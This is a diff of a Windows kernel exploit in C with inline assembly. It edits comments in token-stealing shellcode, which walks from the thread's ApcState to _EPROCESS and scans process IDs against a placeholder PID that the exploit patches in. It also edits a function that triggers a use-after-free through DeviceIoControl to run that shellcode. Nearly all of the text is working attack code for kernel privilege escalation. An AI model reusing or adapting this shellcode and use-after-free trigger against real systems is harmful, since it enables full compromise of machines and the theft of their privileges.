@@ -36,7 +36,7 @@ __asm__(
 						"add rbx, 152;"				//offset to apcState
 						"mov rax, [rbx];"
 
-						"add rax, 32;"				//offset to Process aka _EPROCESS
+						"add rax, 32;"				//offset to Process _EPROCESS
 						"mov rbx, [rax];"
 
 						"mov rcx, rbx;"
@@ -50,8 +50,8 @@ __asm__(
 
 						"sub rdx, 752;"				//get offset to base _EPROCESS
 
-						"mov rcx, [rdx+744];"		//get offset to UniqueProcessId
-						"cmp rcx, 6969;"			//compare with PID. Need to be overwritten from th from the exploit
+						"mov rcx, [rdx+744];"			//get offset to UniqueProcessId
+						"cmp rcx, 6969;"			//compare with PID. Need to be overwritten from the exploit
 						"je found;"
 						"jmp search;"
 						
@@ -154,7 +154,7 @@ void free(HANDLE h)
 		}
 		return;
 }
-// Use the freed object resulting in a physical-page access which might be changed
+// Use the freed object resulting in a physical-page access which can lead to shellcode execution  
 void usePage(HANDLE h)
 {
 		bool r = DeviceIoControl(h, use_uaf, NULL, 0, NULL, 0, NULL, NULL);
